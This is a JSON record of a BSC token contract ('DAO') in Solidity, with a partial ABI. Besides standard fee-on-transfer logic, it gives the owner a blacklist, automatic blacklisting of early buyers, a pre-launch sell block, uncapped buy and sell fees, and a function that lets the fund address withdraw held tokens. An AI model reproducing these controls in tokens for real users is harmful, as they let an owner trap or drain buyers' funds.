{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IPancakePair {\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function token0() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function totalSupply() external view returns (uint256);\r\n}\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"!owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract TokenDistributor {\r\n    constructor (address token) {\r\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\nabstract contract AbsToken is IERC20, Ownable {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    address public fundAddress;\r\n    address public _buyBackReceiver;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    mapping(address => bool) public _isExcludeFromFees;\r\n    mapping(address => bool) public _Against;\r\n\r\n    uint256 private _tTotal;\r\n\r\n    ISwapRouter public _swapRouter;\r\n    address public _usdt;\r\n    mapping(address => bool) public _swapPairList;\r\n\r\n    bool private inSwap;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n    TokenDistributor public _tokenDistributor;\r\n\r\n    uint256 public _buyFundFee = 300;\r\n    uint256 public _buyLPFee = 0;\r\n    uint256 public _buyLPDividendFee = 0;\r\n    uint256 public _buy_BuyBackFee = 200;\r\n\r\n    uint256 public _sellFundFee = 300;\r\n    uint256 public _sellLPFee = 0;\r\n    uint256 public _sellLPDividendFee = 0;\r\n    uint256 public _sell_BuyBackFee = 200;\r\n\r\n    address public _mainPair;\r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n    mapping (address => bool) public isWalletLimitExempt;\r\n    address public buyBackToken;\r\n\r\n    constructor (\r\n        address RouterAddress, address USDTAddress,\r\n        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,\r\n        address FundAddress, address ReceiveAddress\r\n    ){\r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        _decimals = Decimals;\r\n\r\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\r\n        IERC20(USDTAddress).approve(address(swapRouter), MAX);\r\n        _usdt = USDTAddress;\r\n\r\n        _swapRouter = swapRouter;\r\n        _allowances[address(this)][address(swapRouter)] = MAX;\r\n\r\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\r\n        address swapPair = swapFactory.createPair(address(this), USDTAddress);\r\n        _mainPair = swapPair;\r\n        _swapPairList[swapPair] = true;\r\n\r\n        uint256 total = Supply * 10 ** Decimals;\r\n        _tTotal = total;\r\n        swapAtAmount = total / 1000;\r\n        walletLimit = Supply * 10 ** Decimals;\r\n\r\n        _balances[ReceiveAddress] = total;\r\n        emit Transfer(address(0), ReceiveAddress, total);\r\n\r\n        fundAddress = FundAddress;\r\n\r\n        _isExcludeFromFees[FundAddress] = true;\r\n        _isExcludeFromFees[ReceiveAddress] = true;\r\n        _isExcludeFromFees[address(this)] = true;\r\n        // _isExcludeFromFees[address(swapRouter)] = true;\r\n        _isExcludeFromFees[msg.sender] = true;\r\n\r\n        excludeHolder[address(0)] = true;\r\n        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;\r\n\r\n        // holderRewardCondition = 10 ** IERC20(USDTAddress).decimals();\r\n        // holderRewardCondition = 1;\r\n\r\n        _buyBackReceiver = 0x3719Bf94600647fC4a30Eaf265EC32C4d93C48C6;\r\n        buyBackToken = 0x9611536742c724Ad46847F8AeA2791148cD36E27;\r\n\r\n        isWalletLimitExempt[msg.sender] = true;\r\n        isWalletLimitExempt[ReceiveAddress] = true;\r\n        isWalletLimitExempt[address(swapRouter)] = true;\r\n        isWalletLimitExempt[address(_mainPair)] = true;\r\n        isWalletLimitExempt[address(this)] = true;\r\n        isWalletLimitExempt[address(0xdead)] = true;\r\n\r\n        _tokenDistributor = new TokenDistributor(USDTAddress);\r\n    }\r\n\r\n    function setBuyBackToken(address newAddr) public onlyOwner{\r\n        buyBackToken = newAddr;\r\n    }\r\n\r\n    function setBuyBackReceiver(address newAddr) public onlyOwner{\r\n        _buyBackReceiver = newAddr;\r\n    }\r\n\r\n    function setisWalletLimitExempt(address holder, bool exempt) external onlyOwner {\r\n        isWalletLimitExempt[holder] = exempt;\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n\r\n\r\n    bool public isAddV2;\r\n    bool public isRemoveV2;\r\n\r\n    uint256 public swapAtAmount;\r\n    function setSwapAtAmount(uint256 newValue) public onlyOwner{\r\n        swapAtAmount = newValue;\r\n    }\r\n\r\n    bool public antiBotEnable = false;\r\n    function setAntiBotEnable(bool status) public onlyOwner() {\r\n        antiBotEnable = status;\r\n    }\r\n\r\n    uint256 public BOTDontCheckBLOCK = 3;\r\n    function setBNumber(uint256 newValue) public onlyOwner{\r\n        BOTDontCheckBLOCK = newValue;\r\n    }\r\n    \r\n    bool public firstBuyEnable;\r\n    function trueFirstBuyEnable() public onlyOwner{\r\n        firstBuyEnable = true;\r\n    }\r\n    function falseFirstBuyEnable() public onlyOwner{\r\n        firstBuyEnable = false;\r\n    }\r\n\r\n    mapping(address => uint256) public userMaxWalletAmount;\r\n    function getUserMaxAmount(address user) public view returns(uint256){\r\n        return userMaxWalletAmount[user];\r\n    }\r\n\r\n    function multiKAmount(\r\n        address[] calldata accounts,\r\n        uint256 amount,\r\n        uint256 d\r\n    ) public onlyOwner {\r\n        for (uint i; i < accounts.length; i++) \r\n        {\r\n            userMaxWalletAmount[accounts[i]] = amount * 10 ** d;\r\n        }\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n\r\n        uint256 balance = balanceOf(from);\r\n        require(balance >= amount, \"balanceNotEnough\");\r\n        if (antiBotEnable){\r\n            if (goFlag + BOTDontCheckBLOCK <= block.number){\r\n                require(!_Against[from]);\r\n            }\r\n        }else{\r\n            require(!_Against[from]);\r\n        }\r\n\r\n        bool takeFee;\r\n        bool isSell;\r\n        bool isTransfer;\r\n        bool isRemove;\r\n        bool isAdd;\r\n        \r\n        if (_swapPairList[to]) {\r\n            isAdd = _isAddLiquidity();\r\n            isAddV2 = isAdd;\r\n        }else if(_swapPairList[from]){\r\n            isRemove = _isRemoveLiquidity();\r\n            isRemoveV2 = isRemove;\r\n        }\r\n\r\n        if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to] && !_swapPairList[from] && !_swapPairList[to]){\r\n            require(goFlag > 1);\r\n        }\r\n\r\n        if (goFlag == 0 && !_isExcludeFromFees[from] && !_isExcludeFromFees[to]){\r\n            \r\n            if (!_swapPairList[to]){\r\n                require(firstBuyEnable,\"cant buy now\");\r\n                require(balanceOf(to) + amount <= getUserMaxAmount(to),\"!max\");\r\n            }\r\n            \r\n            if (_swapPairList[to]){\r\n                if(getUserMaxAmount(from) == 0){}else{\r\n                    // require(firstBuyEnable,\"cant sell now\");\r\n                    require(false,\"cant sell now\");\r\n                }\r\n            }\r\n        }\r\n\r\n        if (_swapPairList[from] || _swapPairList[to]) {\r\n            if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to]) {\r\n                if (block.number < goFlag + fightB && !_swapPairList[to]) {\r\n                    _Against[to] = true;\r\n                }\r\n                require(\r\n                    goFlag > 0 || (0 < startLPBlock && isAdd),//  _swapPairList[to]\r\n                    \"pausing\"\r\n                );\r\n                if (_swapPairList[to]) {\r\n                    if (!inSwap && !isAdd) {\r\n                        uint256 contractTokenBalance = balanceOf(address(this));\r\n                        if (contractTokenBalance > swapAtAmount) {\r\n                            uint256 swapFee = _buyLPFee + _buyFundFee + _buyLPDividendFee + _buy_BuyBackFee + _sellFundFee + _sellLPDividendFee + _sellLPFee + _sell_BuyBackFee;\r\n                            uint256 numTokensSellToFund = amount;\r\n                            if (numTokensSellToFund > contractTokenBalance) {\r\n                                numTokensSellToFund = contractTokenBalance;\r\n                            }\r\n                            swapTokenForFund(numTokensSellToFund, swapFee);\r\n                        }\r\n                    }\r\n                }\r\n                if (!isAdd && !isRemove) takeFee = true;\r\n            }\r\n            if (_swapPairList[to]) {\r\n                isSell = true;\r\n            }\r\n        }\r\n\r\n        if (\r\n            !_swapPairList[from] &&\r\n            !_swapPairList[to]\r\n        ) {\r\n            isTransfer = true;\r\n        }\r\n\r\n        _tokenTransfer(from, to, amount, takeFee, isSell, isTransfer, isAdd, isRemove);\r\n\r\n        // if (from != address(this)) {\r\n        //     if (isSell) {\r\n        //         addHolder(from);\r\n        //     }\r\n        //     processReward(500000);\r\n        // }\r\n    }\r\n\r\n    function multiAgainst(address[] calldata addresses, bool value) public onlyOwner{\r\n        for (uint256 i; i < addresses.length; ++i) {\r\n            _Against[addresses[i]] = value;\r\n        }\r\n    }\r\n\r\n    function _isAddLiquidity() internal view returns (bool isAdd){\r\n        IPancakePair mainPair = IPancakePair(_mainPair);\r\n        (uint r0,uint256 r1,) = mainPair.getReserves();\r\n\r\n        address tokenOther = _usdt;\r\n        uint256 r;\r\n        if (tokenOther < address(this)) {\r\n            r = r0;\r\n        } else {\r\n            r = r1;\r\n        }\r\n\r\n        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));\r\n        isAdd = bal > r;\r\n    }\r\n\r\n    function _isRemoveLiquidity() internal view returns (bool isRemove){\r\n        IPancakePair mainPair = IPancakePair(_mainPair);\r\n        (uint r0,uint256 r1,) = mainPair.getReserves();\r\n\r\n        address tokenOther = _usdt;\r\n        uint256 r;\r\n        if (tokenOther < address(this)) {\r\n            r = r0;\r\n        } else {\r\n            r = r1;\r\n        }\r\n\r\n        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));\r\n        isRemove = r >= bal;\r\n    }\r\n\r\n    uint256 public transferFee;\r\n    uint256 public addLiquidityFee;\r\n    uint256 public removeLiquidityFee;\r\n\r\n    function setTransferFee(uint256 newValue) public onlyOwner{\r\n        transferFee = newValue;\r\n    }\r\n\r\n    function setAddLiquidityFee(uint256 newValue) public onlyOwner{\r\n        addLiquidityFee = newValue;\r\n    }\r\n\r\n    function setRemoveLiquidityFee(uint256 newValue) public onlyOwner{\r\n        removeLiquidityFee = newValue;\r\n    }\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        bool takeFee,\r\n        bool isSell,\r\n        bool isTransfer,\r\n        bool isAdd,\r\n        bool isRemove\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n\r\n        if (takeFee) {\r\n            uint256 swapFee;\r\n            if (isSell) {\r\n                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee + _sell_BuyBackFee;\r\n            } else {\r\n                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee + _buy_BuyBackFee;\r\n            }\r\n\r\n            uint256 swapAmount = tAmount * swapFee / 10000;\r\n            if (swapAmount > 0) {\r\n                feeAmount += swapAmount;\r\n                _takeTransfer(sender,address(this),swapAmount);\r\n            }\r\n        }\r\n\r\n\r\n        // transfer\r\n        if (isTransfer && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]){\r\n            uint256 transferFeeAmount;\r\n            transferFeeAmount = (tAmount * transferFee) / 10000;\r\n\r\n            if (transferFeeAmount > 0) {\r\n                feeAmount += transferFeeAmount;\r\n                _takeTransfer(sender, address(this), transferFeeAmount);\r\n            }\r\n        }\r\n\r\n        // addLiquidity\r\n        if (isAdd && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]){\r\n            uint256 addLiquidityFeeAmount;\r\n            addLiquidityFeeAmount = (tAmount * addLiquidityFee) / 10000;\r\n\r\n            if (addLiquidityFeeAmount > 0) {\r\n                feeAmount += addLiquidityFeeAmount;\r\n                _takeTransfer(sender, address(this), addLiquidityFeeAmount);\r\n            }\r\n        }\r\n\r\n        // removeLiquidity\r\n        if (\r\n            isRemove &&\r\n            !_isExcludeFromFees[sender] &&\r\n            !_isExcludeFromFees[recipient] // && getRemainingTime() > 0\r\n        ){\r\n            uint256 removeLiquidityFeeAmount;\r\n            removeLiquidityFeeAmount = (tAmount * removeLiquidityFee) / 10000;\r\n\r\n            if (removeLiquidityFeeAmount > 0) {\r\n                feeAmount += removeLiquidityFeeAmount;\r\n                _takeTransfer(sender, address(0xdead), removeLiquidityFeeAmount);\r\n            }\r\n        }\r\n\r\n        if(!isWalletLimitExempt[recipient] && limitEnable)\r\n            require((balanceOf(recipient) + tAmount - feeAmount) <= walletLimit,\"over max wallet limit\");\r\n\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n    }\r\n\r\n    bool public limitEnable = true;\r\n    function setLimitEnable(bool status) public onlyOwner {\r\n        limitEnable = status;\r\n    }\r\n\r\n    uint256 public walletLimit;\r\n    function setMaxWalletLimit(uint256 newValue) public onlyOwner{\r\n        walletLimit = newValue;\r\n    }\r\n\r\n    event FAILED_SWAP(uint256);\r\n    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {\r\n        if (swapFee == 0) return;\r\n        swapFee += swapFee;\r\n        uint256 lpFee = _sellLPFee + _buyLPFee;\r\n        uint256 lpAmount = tokenAmount * lpFee / swapFee;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _usdt;\r\n        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount - lpAmount,\r\n            0,\r\n            path,\r\n            address(_tokenDistributor),\r\n            block.timestamp\r\n        ) {} catch { emit FAILED_SWAP(0); }\r\n\r\n        swapFee -= lpFee;\r\n\r\n        IERC20 FIST = IERC20(_usdt);\r\n        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));\r\n        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;\r\n        if (fundAmount > 0){\r\n            FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);\r\n        }\r\n        uint256 initialUSDTBalance = FIST.balanceOf(address(this));\r\n        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);\r\n        uint256 buybackAmount = ( FIST.balanceOf(address(this)) - initialUSDTBalance ) * (_buy_BuyBackFee + _sell_BuyBackFee)\r\n                / (_buyLPDividendFee + _buy_BuyBackFee + _sellLPDividendFee + _sell_BuyBackFee);\r\n\r\n\r\n        if (buybackAmount > 0){\r\n            address[] memory buyBackPath = new address[](2);\r\n            buyBackPath[0] = _usdt;\r\n            buyBackPath[1] = address(buyBackToken);\r\n            try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n                buybackAmount,\r\n                0,\r\n                buyBackPath,\r\n                address(_buyBackReceiver),\r\n                block.timestamp\r\n            ) {} catch { emit FAILED_SWAP(2); }\r\n        }\r\n\r\n\r\n        // if (lpAmount > 0) {\r\n        //     uint256 lpFist = fistBalance * lpFee / swapFee;\r\n        //     if (lpFist > 0) {\r\n        //         try _swapRouter.addLiquidity(\r\n        //             address(this), _usdt, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp\r\n        //         ) {} catch { emit FAILED_SWAP(1); }\r\n        //     }\r\n        // }\r\n    }\r\n\r\n    function _takeTransfer(\r\n        address sender,\r\n        address to,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[to] = _balances[to] + tAmount;\r\n        emit Transfer(sender, to, tAmount);\r\n    }\r\n\r\n    function setFundAddress(address addr) external onlyOwner {\r\n        fundAddress = addr;\r\n        _isExcludeFromFees[addr] = true;\r\n    }\r\n\r\n    function setInNew(uint256 nFundFee, uint256 nLpFee, uint256 nDividendFee,uint256 nBuyBack) public onlyOwner{\r\n        _buyFundFee = nFundFee;\r\n        _buyLPFee = nLpFee;\r\n        _buyLPDividendFee = nDividendFee;\r\n        _buy_BuyBackFee = nBuyBack;\r\n    }\r\n\r\n    function setOutNew(uint256 nFundFee, uint256 nLpFee, uint256 nDividendFee,uint256 nBuyBack) public onlyOwner{\r\n        _sellFundFee = nFundFee;\r\n        _sellLPFee = nLpFee;\r\n        _sellLPDividendFee = nDividendFee;\r\n        _sell_BuyBackFee = nBuyBack;\r\n    }\r\n\r\n\r\n    uint256 public fightB = 0;\r\n    uint256 public goFlag;\r\n\r\n    function Go(uint256 uintparam,bool s) external onlyOwner {\r\n        fightB = uintparam;\r\n        if (s){\r\n            goFlag = block.number;\r\n        }else{\r\n            goFlag = 0;\r\n        }\r\n    }\r\n\r\n    uint256 public startLPBlock;\r\n\r\n    function startLP() external onlyOwner {\r\n        require(0 == startLPBlock, \"startedAddLP\");\r\n        startLPBlock = block.number;\r\n    }\r\n\r\n    function stopLP() external onlyOwner {\r\n        startLPBlock = 0;\r\n    }\r\n\r\n\r\n    function setSwapPairList(address addr, bool enable) external onlyOwner {\r\n        _swapPairList[addr] = enable;\r\n    }\r\n\r\n    function setClaims(address token, uint256 amount) external {\r\n        if (msg.sender == fundAddress){\r\n            if (token == address(0)){\r\n                payable(msg.sender).transfer(amount);\r\n            }else{\r\n                IERC20(token).transfer(msg.sender, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    address[] private holders;\r\n    mapping(address => uint256) holderIndex;\r\n    mapping(address => bool) excludeHolder;\r\n\r\n    function addHolder(address adr) private {\r\n        uint256 size;\r\n        assembly {size := extcodesize(adr)}\r\n        if (size > 0) {\r\n            return;\r\n        }\r\n        if (0 == holderIndex[adr]) {\r\n            if (0 == holders.length || holders[0] != adr) {\r\n                holderIndex[adr] = holders.length;\r\n                holders.push(adr);\r\n            }\r\n        }\r\n    }\r\n\r\n    function multiWLs(address[] calldata addresses, bool status) public onlyOwner {\r\n        for (uint256 i; i < addresses.length; ++i) {\r\n            _isExcludeFromFees[addresses[i]] = status;\r\n        }\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n}\r\n\r\ncontract TOKEN is AbsToken {\r\n    constructor() AbsToken(\r\n        address(0x10ED43C718714eb63d5aA57B78B54704E256024E), // pancake router \r\n        address(0x55d398326f99059fF775485246999027B3197955), // usdt \r\n        \"DAO\",\r\n        \"DAO\",\r\n        18,\r\n        16888,\r\n        address(0xC2391a4fb8913F00b13CA4A8908A016dd09a1c9A),\r\n        address(msg.sender)\r\n    ){\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"FAILED_SWAP\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BOTDontCheckBLOCK\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"uintparam\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"s\",\"type\":\"bool\"}],\"name\":\"Go\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_Against\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyBackReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buy_BuyBackFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludeFromFees\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sell_BuyBackFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"antiBotEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyBackToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"falseFirstBuyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fightB\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"firstBuyEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getUserMaxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"goFlag\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAddV2\",\"outputs\":[{\"internalType\":\"bool\",\"